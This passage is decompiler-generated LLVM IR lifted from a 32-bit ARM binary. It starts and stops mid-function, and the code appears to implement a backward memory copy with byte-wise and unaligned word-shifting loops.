  store i32 %v9_18bd8, i32* %r3.global-to-local, align 4
  br i1 %v5_18bd8, label %.thread20, label %bb142

.thread20:                                        ; preds = %dec_label_pc_18bd4
  store i32 %v7_18bd8, i32* @r1, align 4
  %v8_18bdc = add i32 %v7_18bdc, -4
  %v9_18bdc = inttoptr i32 %v8_18bdc to i32*
  store i32 %v9_18bd8, i32* %v9_18bdc, align 4
  %v10_18bdc = load i32, i32* %r0.global-to-local, align 4
  %v11_18bdc = add i32 %v10_18bdc, -4
  store i32 %v11_18bdc, i32* %r0.global-to-local, align 4
  %v0_18bec.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb143

bb142:                                            ; preds = %dec_label_pc_18bd4
  %v10_18be0 = add i32 %v6_18bd8, -8
  %v11_18be0 = inttoptr i32 %v10_18be0 to i32*
  %v12_18be0 = load i32, i32* %v11_18be0, align 4
  store i32 %v12_18be0, i32* @ip, align 4
  store i32 %v10_18be0, i32* @r1, align 4
  %v7_18be4 = add i32 %v7_18bdc, -8
  %v8_18be4 = inttoptr i32 %v7_18be4 to i32*
  store i32 %v9_18bd8, i32* %v8_18be4, align 4
  %v10_18be4 = add i32 %v7_18bdc, -4
  %v11_18be4 = inttoptr i32 %v10_18be4 to i32*
  %v12_18be4 = load i32, i32* @ip, align 4
  store i32 %v12_18be4, i32* %v11_18be4, align 4
  store i32 %v7_18be4, i32* %r0.global-to-local, align 4
  %v6_18be8 = load i32, i32* %r2.global-to-local, align 4
  %v7_18be8 = add i32 %v6_18be8, -4
  store i32 %v7_18be8, i32* %r2.global-to-local, align 4
  br label %bb143

bb143:                                            ; preds = %.thread20, %.thread26, %dec_label_pc_18bcc, %dec_label_pc_18b5c, %dec_label_pc_18d90, %dec_label_pc_18d24, %dec_label_pc_18cb8, %bb142
  %v2_18bf0 = phi i32 [ %v11_18bdc, %.thread20 ], [ %v0_18c8832, %.thread26 ], [ %v7_18bdc, %dec_label_pc_18bcc ], [ %v2_18b60, %dec_label_pc_18b5c ], [ %v2_18bfc65, %dec_label_pc_18d90 ], [ %v2_18bfc64, %dec_label_pc_18d24 ], [ %v2_18bfc63, %dec_label_pc_18cb8 ], [ %v7_18be4, %bb142 ]
  %v0_18bec = phi i32 [ %v0_18bec.pre, %.thread20 ], [ %v2_18c30, %.thread26 ], [ %v2_18bcc, %dec_label_pc_18bcc ], [ %v2_18b64, %dec_label_pc_18b5c ], [ %v0_18bec61, %dec_label_pc_18d90 ], [ %v0_18bec60, %dec_label_pc_18d24 ], [ %v0_18bec59, %dec_label_pc_18cb8 ], [ %v7_18be8, %bb142 ]
  %v1_18bec = add i32 %v0_18bec, 4
  store i32 %v1_18bec, i32* @r2, align 4
  %v3_18bec = sub i32 0, %v0_18bec
  %v4_18bec = and i32 %v1_18bec, %v3_18bec
  %v5_18bec = icmp slt i32 %v4_18bec, 0
  store i1 %v5_18bec, i1* %cpsr_v.global-to-local, align 1
  %v6_18bec = icmp slt i32 %v1_18bec, 0
  store i1 %v6_18bec, i1* %cpsr_n.global-to-local, align 1
  %v7_18bec = icmp eq i32 %v1_18bec, 0
  store i1 %v7_18bec, i1* @cpsr_z, align 1
  br i1 %v7_18bec, label %.thread123, label %bb144

bb144:                                            ; preds = %bb143
  %v1_18bf4 = add i32 %v0_18bec, 2
  %v3_18bf4 = sub i32 -3, %v0_18bec
  %v4_18bf4 = and i32 %v3_18bf4, %v1_18bec
  %v5_18bf4 = icmp slt i32 %v4_18bf4, 0
  store i1 %v5_18bf4, i1* %cpsr_v.global-to-local, align 1
  %v6_18bf4 = icmp slt i32 %v1_18bf4, 0
  store i1 %v6_18bf4, i1* %cpsr_n.global-to-local, align 1
  %v7_18bf4 = icmp eq i32 %v1_18bec, 2
  store i1 %v7_18bf4, i1* @cpsr_z, align 1
  %v0_18bf8 = load i32, i32* @r1, align 4
  %v1_18bf8 = add i32 %v0_18bf8, -1
  %v2_18bf8 = inttoptr i32 %v1_18bf8 to i8*
  %v3_18bf8 = load i8, i8* %v2_18bf8, align 1
  %v4_18bf8 = zext i8 %v3_18bf8 to i32
  store i32 %v4_18bf8, i32* %r3.global-to-local, align 4
  store i32 %v1_18bf8, i32* @r1, align 4
  %v3_18bfc = add i32 %v2_18bf0, -1
  %v4_18bfc = inttoptr i32 %v3_18bfc to i8*
  store i8 %v3_18bf8, i8* %v4_18bfc, align 1
  %v5_18bfc = load i32, i32* %r0.global-to-local, align 4
  %v6_18bfc = add i32 %v5_18bfc, -1
  store i32 %v6_18bfc, i32* %r0.global-to-local, align 4
  %v0_18c00 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_18c00 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_18c00 = xor i1 %v0_18c00, %v1_18c00
  br i1 %v2_18c00, label %.thread122, label %bb145

bb145:                                            ; preds = %bb144
  %v3_18c00 = load i32, i32* @r1, align 4
  %v4_18c00 = add i32 %v3_18c00, -1
  %v5_18c00 = inttoptr i32 %v4_18c00 to i8*
  %v6_18c00 = load i8, i8* %v5_18c00, align 1
  %v7_18c00 = zext i8 %v6_18c00 to i32
  store i32 %v7_18c00, i32* %r3.global-to-local, align 4
  store i32 %v4_18c00, i32* @r1, align 4
  %v6_18c04 = add i32 %v5_18bfc, -2
  %v7_18c04 = inttoptr i32 %v6_18c04 to i8*
  store i8 %v6_18c00, i8* %v7_18c04, align 1
  %v8_18c04 = load i32, i32* %r0.global-to-local, align 4
  %v9_18c04 = add i32 %v8_18c04, -1
  store i32 %v9_18c04, i32* %r0.global-to-local, align 4
  %v1_18c08.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_18c08.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread122

.thread122:                                       ; preds = %bb144, %bb145
  %v7_18c0c = phi i32 [ %v9_18c04, %bb145 ], [ %v6_18bfc, %bb144 ]
  %v2_18c0c = phi i1 [ %v2_18c08.pre, %bb145 ], [ %v1_18c00, %bb144 ]
  %v1_18c0c = phi i1 [ %v1_18c08.pre, %bb145 ], [ %v0_18c00, %bb144 ]
  %v0_18c08 = load i1, i1* @cpsr_z, align 1
  %v3_18c08 = xor i1 %v2_18c0c, %v1_18c0c
  %v4_18c08 = or i1 %v0_18c08, %v3_18c08
  br i1 %v4_18c08, label %.thread123, label %bb146

bb146:                                            ; preds = %.thread122
  %v5_18c08 = load i32, i32* @r1, align 4
  %v6_18c08 = add i32 %v5_18c08, -1
  %v7_18c08 = inttoptr i32 %v6_18c08 to i8*
  %v8_18c08 = load i8, i8* %v7_18c08, align 1
  %v9_18c08 = zext i8 %v8_18c08 to i32
  store i32 %v9_18c08, i32* %r3.global-to-local, align 4
  store i32 %v6_18c08, i32* @r1, align 4
  %v8_18c0c = add i32 %v7_18c0c, -1
  %v9_18c0c = inttoptr i32 %v8_18c0c to i8*
  store i8 %v8_18c08, i8* %v9_18c0c, align 1
  %v10_18c0c = load i32, i32* %r0.global-to-local, align 4
  %v11_18c0c = add i32 %v10_18c0c, -1
  store i32 %v11_18c0c, i32* %r0.global-to-local, align 4
  br label %.thread123

dec_label_pc_18c14:                               ; preds = %dec_label_pc_18b6c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_18c14 = icmp eq i32 %v1_18b6c, 1
  store i1 %v8_18c14, i1* %cpsr_n.global-to-local, align 1
  %v1_18c18 = add i32 %v2_18b5c, -1
  %v2_18c18 = inttoptr i32 %v1_18c18 to i8*
  %v3_18c18 = load i8, i8* %v2_18c18, align 1
  %v4_18c18 = zext i8 %v3_18c18 to i32
  store i32 %v4_18c18, i32* %r3.global-to-local, align 4
  store i32 %v1_18c18, i32* @r1, align 4
  %v3_18c1c = add i32 %v2_18b60, -1
  %v4_18c1c = inttoptr i32 %v3_18c1c to i8*
  store i8 %v3_18c18, i8* %v4_18c1c, align 1
  %v5_18c1c = load i32, i32* %r0.global-to-local, align 4
  %v6_18c1c = add i32 %v5_18c1c, -1
  store i32 %v6_18c1c, i32* %r0.global-to-local, align 4
  br i1 %v8_18c14, label %.thread26, label %bb147

bb147:                                            ; preds = %dec_label_pc_18c14
  %v9_18c14 = icmp eq i32 %v1_18b6c, 2
  %v6_18c20 = load i32, i32* @r1, align 4
  %v7_18c20 = add i32 %v6_18c20, -1
  %v8_18c20 = inttoptr i32 %v7_18c20 to i8*
  %v9_18c20 = load i8, i8* %v8_18c20, align 1
  %v10_18c20 = zext i8 %v9_18c20 to i32
  store i32 %v10_18c20, i32* %r3.global-to-local, align 4
  store i32 %v7_18c20, i32* @r1, align 4
  %v9_18c24 = add i32 %v5_18c1c, -2
  %v10_18c24 = inttoptr i32 %v9_18c24 to i8*
  store i8 %v9_18c20, i8* %v10_18c24, align 1
  %v11_18c24 = load i32, i32* %r0.global-to-local, align 4
  %v12_18c24 = add i32 %v11_18c24, -1
  store i32 %v12_18c24, i32* %r0.global-to-local, align 4
  br i1 %v9_18c14, label %.thread26, label %bb148

bb148:                                            ; preds = %bb147
  %v8_18c28 = load i32, i32* @r1, align 4
  %v9_18c28 = add i32 %v8_18c28, -1
  %v10_18c28 = inttoptr i32 %v9_18c28 to i8*
  %v11_18c28 = load i8, i8* %v10_18c28, align 1
  %v12_18c28 = zext i8 %v11_18c28 to i32
  store i32 %v12_18c28, i32* %r3.global-to-local, align 4
  store i32 %v9_18c28, i32* @r1, align 4
  %v11_18c2c = add i32 %v11_18c24, -2
  %v12_18c2c = inttoptr i32 %v11_18c2c to i8*
  store i8 %v11_18c28, i8* %v12_18c2c, align 1
  %v13_18c2c = load i32, i32* %r0.global-to-local, align 4
  %v14_18c2c = add i32 %v13_18c2c, -1
  store i32 %v14_18c2c, i32* %r0.global-to-local, align 4
  br label %.thread26

.thread26:                                        ; preds = %bb147, %dec_label_pc_18c14, %bb148
  %v0_18c8832 = phi i32 [ %v12_18c24, %bb147 ], [ %v6_18c1c, %dec_label_pc_18c14 ], [ %v14_18c2c, %bb148 ]
  %v0_18c30 = load i32, i32* %r2.global-to-local, align 4
  %v1_18c30 = load i32, i32* @ip, align 4
  %v2_18c30 = sub i32 %v0_18c30, %v1_18c30
  store i32 %v2_18c30, i32* %r2.global-to-local, align 4
  %v4_18c30 = xor i32 %v1_18c30, %v0_18c30
  %v5_18c30 = xor i32 %v2_18c30, %v0_18c30
  %v6_18c30 = and i32 %v5_18c30, %v4_18c30
  %v7_18c30 = icmp slt i32 %v6_18c30, 0
  store i1 %v7_18c30, i1* %cpsr_v.global-to-local, align 1
  %v8_18c30 = icmp slt i32 %v2_18c30, 0
  store i1 %v8_18c30, i1* %cpsr_n.global-to-local, align 1
  %v5_18c34 = icmp slt i32 %v0_18c30, %v1_18c30
  br i1 %v5_18c34, label %bb143, label %dec_label_pc_18c38

dec_label_pc_18c38:                               ; preds = %.thread26
  %v0_18c38 = load i32, i32* @r1, align 4
  %v1_18c38 = urem i32 %v0_18c38, 4
  store i32 %v1_18c38, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18c38 = icmp eq i32 %v1_18c38, 0
  br i1 %v2_18c38, label %dec_label_pc_18b7c, label %dec_label_pc_18c40

dec_label_pc_18c40:                               ; preds = %dec_label_pc_18b74, %dec_label_pc_18c38
  %v0_18c8831 = phi i32 [ %v2_18b60, %dec_label_pc_18b74 ], [ %v0_18c8832, %dec_label_pc_18c38 ]
  %v0_18d34 = phi i32 [ %v2_18b64, %dec_label_pc_18b74 ], [ %v2_18c30, %dec_label_pc_18c38 ]
  %v0_18c40 = phi i32 [ %v2_18b5c, %dec_label_pc_18b74 ], [ %v0_18c38, %dec_label_pc_18c38 ]
  %v0_18c48 = phi i32 [ %v1_18b74, %dec_label_pc_18b74 ], [ %v1_18c38, %dec_label_pc_18c38 ]
  %v1_18c40 = and i32 %v0_18c40, -4
  store i32 %v1_18c40, i32* %r1.global-to-local, align 4
  %v1_18c44 = inttoptr i32 %v1_18c40 to i32*
  %v2_18c44 = load i32, i32* %v1_18c44, align 4
  store i32 %v2_18c44, i32* %r3.global-to-local, align 4
  %v7_18c48 = icmp ult i32 %v0_18c48, 2
  %v2_18d2c = add i32 %v0_18d34, -12
  %v4_18d2c = sub i32 11, %v0_18d34
  %v5_18d2c = and i32 %v4_18d2c, %v0_18d34
  %v6_18d2c = icmp slt i32 %v5_18d2c, 0
  store i1 %v6_18d2c, i1* %cpsr_v.global-to-local, align 1
  %v7_18d2c = icmp slt i32 %v2_18d2c, 0
  store i1 %v7_18d2c, i1* %cpsr_n.global-to-local, align 1
  %v5_18d30 = icmp slt i32 %v0_18d34, 12
  br i1 %v7_18c48, label %dec_label_pc_18d2c, label %dec_label_pc_18c50

dec_label_pc_18c50:                               ; preds = %dec_label_pc_18c40
  %v8_18c48 = icmp eq i32 %v0_18c48, 2
  br i1 %v8_18c48, label %dec_label_pc_18cc0, label %dec_label_pc_18c54

dec_label_pc_18c54:                               ; preds = %dec_label_pc_18c50
  br i1 %v5_18d30, label %dec_label_pc_18ca0, label %dec_label_pc_18c5c

dec_label_pc_18c5c:                               ; preds = %dec_label_pc_18c54
  store i32 %v2_18d2c, i32* %r2.global-to-local, align 4
  %v3_18c60 = load i32, i32* @r4, align 4
  store i32 %v3_18c60, i32* %stack_var_-12, align 4
  %v6_18c60 = load i32, i32* @r5, align 4
  %v8_18c60 = inttoptr i32 %v6_18c60 to i8*
  store i8* %v8_18c60, i8** %stack_var_-8, align 4
  %v11_18c60 = load i32, i32* @lr, align 4
  br label %dec_label_pc_18c64

dec_label_pc_18c64:                               ; preds = %dec_label_pc_18c64.dec_label_pc_18c64_crit_edge, %dec_label_pc_18c5c
  %v0_18c88 = phi i32 [ %v1_18c88, %dec_label_pc_18c64.dec_label_pc_18c64_crit_edge ], [ %v0_18c8831, %dec_label_pc_18c5c ]
  %v0_18c68 = phi i32 [ %v0_18c68.pre, %dec_label_pc_18c64.dec_label_pc_18c64_crit_edge ], [ %v1_18c40, %dec_label_pc_18c5c ]
  %v0_18c64 = phi i32 [ %v0_18c64.pre, %dec_label_pc_18c64.dec_label_pc_18c64_crit_edge ], [ %v2_18c44, %dec_label_pc_18c5c ]
  %v3_18c64 = mul i32 %v0_18c64, 256
  store i32 %v3_18c64, i32* %lr.global-to-local, align 4
  %v1_18c68 = add i32 %v0_18c68, -4
  %v2_18c68 = inttoptr i32 %v1_18c68 to i32*
  %v3_18c68 = load i32, i32* %v2_18c68, align 4
  store i32 %v3_18c68, i32* %r3.global-to-local, align 4
  %v4_18c68 = add i32 %v0_18c68, -8
  %v5_18c68 = inttoptr i32 %v4_18c68 to i32*
  %v6_18c68 = load i32, i32* %v5_18c68, align 4
  store i32 %v6_18c68, i32* %r4.global-to-local, align 4
  %v7_18c68 = add i32 %v0_18c68, -12
  %v8_18c68 = inttoptr i32 %v7_18c68 to i32*
  %v9_18c68 = load i32, i32* %v8_18c68, align 4
  store i32 %v9_18c68, i32* %r5.global-to-local, align 4
  %v10_18c68 = add i32 %v0_18c68, -16
  %v11_18c68 = inttoptr i32 %v10_18c68 to i32*
  %v12_18c68 = load i32, i32* %v11_18c68, align 4
  store i32 %v10_18c68, i32* %r1.global-to-local, align 4
  %v4_18c6c = udiv i32 %v12_18c68, 16777216
  %v5_18c6c = or i32 %v4_18c6c, %v3_18c64
  store i32 %v5_18c6c, i32* %lr.global-to-local, align 4
  %v3_18c70 = mul i32 %v12_18c68, 256
  %v4_18c74 = udiv i32 %v9_18c68, 16777216
  %v5_18c74 = or i32 %v3_18c70, %v4_18c74
  store i32 %v5_18c74, i32* @ip, align 4
  %v3_18c78 = mul i32 %v9_18c68, 256
  %v4_18c7c = udiv i32 %v6_18c68, 16777216
  %v5_18c7c = or i32 %v3_18c78, %v4_18c7c
  store i32 %v5_18c7c, i32* %r5.global-to-local, align 4
  %v3_18c80 = mul i32 %v6_18c68, 256
  %v4_18c84 = udiv i32 %v3_18c68, 16777216
  %v5_18c84 = or i32 %v3_18c80, %v4_18c84
  store i32 %v5_18c84, i32* %r4.global-to-local, align 4
  %v1_18c88 = add i32 %v0_18c88, -16
  %v2_18c88 = inttoptr i32 %v1_18c88 to i32*
  store i32 %v5_18c84, i32* %v2_18c88, align 4
  %v4_18c88 = add i32 %v0_18c88, -12
  %v5_18c88 = inttoptr i32 %v4_18c88 to i32*
  %v6_18c88 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_18c88, i32* %v5_18c88, align 4
  %v7_18c88 = add i32 %v0_18c88, -8
  %v8_18c88 = inttoptr i32 %v7_18c88 to i32*
  %v9_18c88 = load i32, i32* @ip, align 4
  store i32 %v9_18c88, i32* %v8_18c88, align 4
  %v10_18c88 = add i32 %v0_18c88, -4
  %v11_18c88 = inttoptr i32 %v10_18c88 to i32*
  %v12_18c88 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18c88, i32* %v11_18c88, align 4
  store i32 %v1_18c88, i32* %r0.global-to-local, align 4
  %v0_18c8c = load i32, i32* %r2.global-to-local, align 4
  %v2_18c8c = add i32 %v0_18c8c, -16
  store i32 %v2_18c8c, i32* %r2.global-to-local, align 4
  %v6_18c90 = icmp slt i32 %v0_18c8c, 16
  br i1 %v6_18c90, label %dec_label_pc_18c94, label %dec_label_pc_18c64.dec_label_pc_18c64_crit_edge

dec_label_pc_18c64.dec_label_pc_18c64_crit_edge:  ; preds = %dec_label_pc_18c64
  %v0_18c64.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_18c68.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18c64

dec_label_pc_18c94:                               ; preds = %dec_label_pc_18c64
  %v2_18c94 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18c94, i32* @r4, align 4
  %v5_18c94 = load i8*, i8** %stack_var_-8, align 4
  %v6_18c94 = ptrtoint i8* %v5_18c94 to i32
  store i32 %v6_18c94, i32* @r5, align 4
  store i32 %v11_18c60, i32* @lr, align 4
  %v2_18c98 = add i32 %v0_18c8c, -4
  store i32 %v2_18c98, i32* %r2.global-to-local, align 4
  %v4_18c98 = add i32 %v0_18c8c, 2147483632
  %v5_18c98 = and i32 %v2_18c98, %v4_18c98
  %v6_18c98 = icmp slt i32 %v5_18c98, 0
  store i1 %v6_18c98, i1* %cpsr_v.global-to-local, align 1
  %v7_18c98 = icmp slt i32 %v2_18c98, 0
  store i1 %v7_18c98, i1* %cpsr_n.global-to-local, align 1
  %v5_18c9c = icmp slt i32 %v2_18c8c, -12
  br i1 %v5_18c9c, label %dec_label_pc_18cb8, label %dec_label_pc_18ca0

dec_label_pc_18ca0:                               ; preds = %dec_label_pc_18c94, %dec_label_pc_18c54, %dec_label_pc_18ca0
  %v1_18cac = phi i32 [ %v5_18cac, %dec_label_pc_18ca0 ], [ %v1_18c88, %dec_label_pc_18c94 ], [ %v0_18c8831, %dec_label_pc_18c54 ]
  %v0_18ca0 = load i32, i32* %r3.global-to-local, align 4
  %v3_18ca0 = mul i32 %v0_18ca0, 256
  store i32 %v3_18ca0, i32* %ip.global-to-local, align 4
  %v0_18ca4 = load i32, i32* %r1.global-to-local, align 4
  %v1_18ca4 = add i32 %v0_18ca4, -4
  %v2_18ca4 = inttoptr i32 %v1_18ca4 to i32*
  %v3_18ca4 = load i32, i32* %v2_18ca4, align 4
  store i32 %v3_18ca4, i32* %r3.global-to-local, align 4
  store i32 %v1_18ca4, i32* %r1.global-to-local, align 4
  %v4_18ca8 = udiv i32 %v3_18ca4, 16777216
  %v5_18ca8 = or i32 %v4_18ca8, %v3_18ca0
  store i32 %v5_18ca8, i32* @ip, align 4
  %v2_18cac = add i32 %v1_18cac, -4
  %v3_18cac = inttoptr i32 %v2_18cac to i32*
  store i32 %v5_18ca8, i32* %v3_18cac, align 4
  %v4_18cac = load i32, i32* %r0.global-to-local, align 4
  %v5_18cac = add i32 %v4_18cac, -4
  store i32 %v5_18cac, i32* %r0.global-to-local, align 4
  %v0_18cb0 = load i32, i32* %r2.global-to-local, align 4
  %v2_18cb0 = add i32 %v0_18cb0, -4
  store i32 %v2_18cb0, i32* %r2.global-to-local, align 4
  %v6_18cb4 = icmp slt i32 %v0_18cb0, 4
  br i1 %v6_18cb4, label %dec_label_pc_18cb8.loopexit, label %dec_label_pc_18ca0

dec_label_pc_18cb8.loopexit:                      ; preds = %dec_label_pc_18ca0
  %v4_18cb0 = sub i32 3, %v0_18cb0
  %v5_18cb0 = and i32 %v4_18cb0, %v0_18cb0
  %v6_18cb0 = icmp slt i32 %v5_18cb0, 0
  %v7_18cb0 = icmp slt i32 %v2_18cb0, 0
  store i1 %v6_18cb0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18cb0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_18cb8

dec_label_pc_18cb8:                               ; preds = %dec_label_pc_18cb8.loopexit, %dec_label_pc_18c94
  %v2_18bfc63 = phi i32 [ %v5_18cac, %dec_label_pc_18cb8.loopexit ], [ %v1_18c88, %dec_label_pc_18c94 ]
  %v0_18bec59 = phi i32 [ %v2_18cb0, %dec_label_pc_18cb8.loopexit ], [ %v2_18c98, %dec_label_pc_18c94 ]
  %v0_18cb8 = load i32, i32* %r1.global-to-local, align 4
  %v1_18cb8 = add i32 %v0_18cb8, 3
  store i32 %v1_18cb8, i32* @r1, align 4
  br label %bb143

dec_label_pc_18cc0:                               ; preds = %dec_label_pc_18c50
  br i1 %v5_18d30, label %dec_label_pc_18d0c, label %dec_label_pc_18cc8

dec_label_pc_18cc8:                               ; preds = %dec_label_pc_18cc0
  store i32 %v2_18d2c, i32* %r2.global-to-local, align 4
  %v3_18ccc = load i32, i32* @r4, align 4
  store i32 %v3_18ccc, i32* %stack_var_-12, align 4
  %v6_18ccc = load i32, i32* @r5, align 4
  %v8_18ccc = inttoptr i32 %v6_18ccc to i8*
  store i8* %v8_18ccc, i8** %stack_var_-8, align 4
  %v11_18ccc = load i32, i32* @lr, align 4
  br label %dec_label_pc_18cd0

dec_label_pc_18cd0:                               ; preds = %dec_label_pc_18cd0.dec_label_pc_18cd0_crit_edge, %dec_label_pc_18cc8
  %v0_18cf4 = phi i32 [ %v1_18cf4, %dec_label_pc_18cd0.dec_label_pc_18cd0_crit_edge ], [ %v0_18c8831, %dec_label_pc_18cc8 ]
  %v0_18cd4 = phi i32 [ %v0_18cd4.pre, %dec_label_pc_18cd0.dec_label_pc_18cd0_crit_edge ], [ %v1_18c40, %dec_label_pc_18cc8 ]
  %v0_18cd0 = phi i32 [ %v0_18cd0.pre, %dec_label_pc_18cd0.dec_label_pc_18cd0_crit_edge ], [ %v2_18c44, %dec_label_pc_18cc8 ]
  %v3_18cd0 = mul i32 %v0_18cd0, 65536
  store i32 %v3_18cd0, i32* %lr.global-to-local, align 4
  %v1_18cd4 = add i32 %v0_18cd4, -4
  %v2_18cd4 = inttoptr i32 %v1_18cd4 to i32*
  %v3_18cd4 = load i32, i32* %v2_18cd4, align 4
  store i32 %v3_18cd4, i32* %r3.global-to-local, align 4
  %v4_18cd4 = add i32 %v0_18cd4, -8
  %v5_18cd4 = inttoptr i32 %v4_18cd4 to i32*
  %v6_18cd4 = load i32, i32* %v5_18cd4, align 4
  store i32 %v6_18cd4, i32* %r4.global-to-local, align 4
  %v7_18cd4 = add i32 %v0_18cd4, -12
  %v8_18cd4 = inttoptr i32 %v7_18cd4 to i32*
  %v9_18cd4 = load i32, i32* %v8_18cd4, align 4
  store i32 %v9_18cd4, i32* %r5.global-to-local, align 4
  %v10_18cd4 = add i32 %v0_18cd4, -16
  %v11_18cd4 = inttoptr i32 %v10_18cd4 to i32*
  %v12_18cd4 = load i32, i32* %v11_18cd4, align 4
  store i32 %v10_18cd4, i32* %r1.global-to-local, align 4
  %v4_18cd8 = udiv i32 %v12_18cd4, 65536
  %v5_18cd8 = or i32 %v4_18cd8, %v3_18cd0
  store i32 %v5_18cd8, i32* %lr.global-to-local, align 4
  %v3_18cdc = mul i32 %v12_18cd4, 65536
  %v4_18ce0 = udiv i32 %v9_18cd4, 65536
  %v5_18ce0 = or i32 %v3_18cdc, %v4_18ce0
  store i32 %v5_18ce0, i32* @ip, align 4
  %v3_18ce4 = mul i32 %v9_18cd4, 65536
  %v4_18ce8 = udiv i32 %v6_18cd4, 65536
  %v5_18ce8 = or i32 %v3_18ce4, %v4_18ce8
  store i32 %v5_18ce8, i32* %r5.global-to-local, align 4
  %v3_18cec = mul i32 %v6_18cd4, 65536
  %v4_18cf0 = udiv i32 %v3_18cd4, 65536
  %v5_18cf0 = or i32 %v3_18cec, %v4_18cf0
  store i32 %v5_18cf0, i32* %r4.global-to-local, align 4
  %v1_18cf4 = add i32 %v0_18cf4, -16
  %v2_18cf4 = inttoptr i32 %v1_18cf4 to i32*
  store i32 %v5_18cf0, i32* %v2_18cf4, align 4
  %v4_18cf4 = add i32 %v0_18cf4, -12
  %v5_18cf4 = inttoptr i32 %v4_18cf4 to i32*
  %v6_18cf4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_18cf4, i32* %v5_18cf4, align 4
  %v7_18cf4 = add i32 %v0_18cf4, -8
  %v8_18cf4 = inttoptr i32 %v7_18cf4 to i32*
  %v9_18cf4 = load i32, i32* @ip, align 4
  store i32 %v9_18cf4, i32* %v8_18cf4, align 4
  %v10_18cf4 = add i32 %v0_18cf4, -4
  %v11_18cf4 = inttoptr i32 %v10_18cf4 to i32*
  %v12_18cf4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18cf4, i32* %v11_18cf4, align 4
  store i32 %v1_18cf4, i32* %r0.global-to-local, align 4
  %v0_18cf8 = load i32, i32* %r2.global-to-local, align 4
  %v2_18cf8 = add i32 %v0_18cf8, -16
  store i32 %v2_18cf8, i32* %r2.global-to-local, align 4
  %v6_18cfc = icmp slt i32 %v0_18cf8, 16
  br i1 %v6_18cfc, label %dec_label_pc_18d00, label %dec_label_pc_18cd0.dec_label_pc_18cd0_crit_edge

dec_label_pc_18cd0.dec_label_pc_18cd0_crit_edge:  ; preds = %dec_label_pc_18cd0
  %v0_18cd0.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_18cd4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18cd0

dec_label_pc_18d00:                               ; preds = %dec_label_pc_18cd0
  %v2_18d00 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18d00, i32* @r4, align 4
  %v5_18d00 = load i8*, i8** %stack_var_-8, align 4
  %v6_18d00 = ptrtoint i8* %v5_18d00 to i32
  store i32 %v6_18d00, i32* @r5, align 4
  store i32 %v11_18ccc, i32* @lr, align 4
  %v2_18d04 = add i32 %v0_18cf8, -4
  store i32 %v2_18d04, i32* %r2.global-to-local, align 4
  %v4_18d04 = add i32 %v0_18cf8, 2147483632
  %v5_18d04 = and i32 %v2_18d04, %v4_18d04
  %v6_18d04 = icmp slt i32 %v5_18d04, 0
  store i1 %v6_18d04, i1* %cpsr_v.global-to-local, align 1
  %v7_18d04 = icmp slt i32 %v2_18d04, 0
  store i1 %v7_18d04, i1* %cpsr_n.global-to-local, align 1
  %v5_18d08 = icmp slt i32 %v2_18cf8, -12
  br i1 %v5_18d08, label %dec_label_pc_18d24, label %dec_label_pc_18d0c

dec_label_pc_18d0c:                               ; preds = %dec_label_pc_18d00, %dec_label_pc_18cc0, %dec_label_pc_18d0c
  %v1_18d18 = phi i32 [ %v5_18d18, %dec_label_pc_18d0c ], [ %v1_18cf4, %dec_label_pc_18d00 ], [ %v0_18c8831, %dec_label_pc_18cc0 ]
  %v0_18d0c = load i32, i32* %r3.global-to-local, align 4
  %v3_18d0c = mul i32 %v0_18d0c, 65536
  store i32 %v3_18d0c, i32* %ip.global-to-local, align 4
  %v0_18d10 = load i32, i32* %r1.global-to-local, align 4
  %v1_18d10 = add i32 %v0_18d10, -4
  %v2_18d10 = inttoptr i32 %v1_18d10 to i32*
  %v3_18d10 = load i32, i32* %v2_18d10, align 4
  store i32 %v3_18d10, i32* %r3.global-to-local, align 4
  store i32 %v1_18d10, i32* %r1.global-to-local, align 4
  %v4_18d14 = udiv i32 %v3_18d10, 65536
  %v5_18d14 = or i32 %v4_18d14, %v3_18d0c
  store i32 %v5_18d14, i32* @ip, align 4
  %v2_18d18 = add i32 %v1_18d18, -4
  %v3_18d18 = inttoptr i32 %v2_18d18 to i32*
  store i32 %v5_18d14, i32* %v3_18d18, align 4
  %v4_18d18 = load i32, i32* %r0.global-to-local, align 4
  %v5_18d18 = add i32 %v4_18d18, -4
  store i32 %v5_18d18, i32* %r0.global-to-local, align 4
  %v0_18d1c = load i32, i32* %r2.global-to-local, align 4
  %v2_18d1c = add i32 %v0_18d1c, -4
  store i32 %v2_18d1c, i32* %r2.global-to-local, align 4
  %v6_18d20 = icmp slt i32 %v0_18d1c, 4
  br i1 %v6_18d20, label %dec_label_pc_18d24.loopexit, label %dec_label_pc_18d0c

dec_label_pc_18d24.loopexit:                      ; preds = %dec_label_pc_18d0c
  %v4_18d1c = sub i32 3, %v0_18d1c
  %v5_18d1c = and i32 %v4_18d1c, %v0_18d1c
  %v6_18d1c = icmp slt i32 %v5_18d1c, 0
  %v7_18d1c = icmp slt i32 %v2_18d1c, 0
  store i1 %v6_18d1c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18d1c, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_18d24

dec_label_pc_18d24:                               ; preds = %dec_label_pc_18d24.loopexit, %dec_label_pc_18d00
  %v2_18bfc64 = phi i32 [ %v5_18d18, %dec_label_pc_18d24.loopexit ], [ %v1_18cf4, %dec_label_pc_18d00 ]
  %v0_18bec60 = phi i32 [ %v2_18d1c, %dec_label_pc_18d24.loopexit ], [ %v2_18d04, %dec_label_pc_18d00 ]
